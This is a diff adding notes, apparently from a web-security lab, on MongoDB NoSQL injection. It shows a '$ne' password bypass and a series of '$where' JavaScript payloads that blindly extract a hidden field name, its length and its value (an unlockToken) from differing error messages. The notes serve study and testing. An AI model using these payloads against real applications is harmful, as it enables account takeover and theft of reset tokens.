@@ -132,8 +132,42 @@ the resprctive query is `{"$where":"this.username == 'admin'"}`
 
 
 
+### Extracting filed names , length , values 
 
+```
+db.user.findOne(userInfo)
 
+let userInfo = {
+    "_id": "skjfskmjfsdf",
+    "username": "carlos",
+    "password": {
+        "$ne": ""
+    },
+    "$where": "function(){ return 0;}"
+}
+
+// check error message
+// 1: Account Locked
+// 0: Invalid
+
+// Find the hidden field name than its value
+"$where": "function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0; }"
+
+// Find the hidden field name + its length
+"$where": "function(){ if(Object.keys(this)[3].length == 1) return 1; else 0; }"
+
+// length is 11
+"$where": "function(){ if(Object.keys(this)[3].match(/^a/)) return 1; else 0; }"
+
+// hidden field name is "unlockToken"
+"$where": "function(){ if(this.unlockToken.length == 1) return 1; else 0; }"
+
+// value length is 16
+"$where": "function(){ if(this.unlockToken.match(/^a/)) return 1; else 0; }"
+
+"$where": "function(){ if(this.unlockToken.match(/\\d/)) return 1; else 0; }"
+
+```
 
 
 
